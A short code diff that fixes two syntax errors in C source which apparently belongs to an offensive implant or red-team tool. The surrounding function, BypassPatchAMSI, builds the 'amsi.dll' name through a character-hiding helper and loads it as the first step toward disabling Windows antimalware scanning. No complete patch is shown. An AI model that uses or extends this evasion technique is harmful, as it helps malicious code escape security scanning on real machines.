@@ -212,7 +212,7 @@ PVOID LoaderModSea(
  * @param ModNm Mod name to load
  * @return
  */
-PVOID LoaderModLod
+PVOID LoaderModLod(
     IN LPSTR ModNm
 ) {
     UNICODE_STRING UnicodeString  = { 0 };
@@ -950,7 +950,7 @@ BOOL BypassPatchAMSI(
     Mod[7] = HideChar('L');
     Mod[8] = HideChar('\0');
 
-    hModAmsi = LoaderModLod Mod );
+    hModAmsi = LoaderModLod( Mod );
     MemZero( Mod, sizeof( Mod ) );
 
     PRINTF( "[+] Loaded asmi.dll: %p\n", hModAmsi );
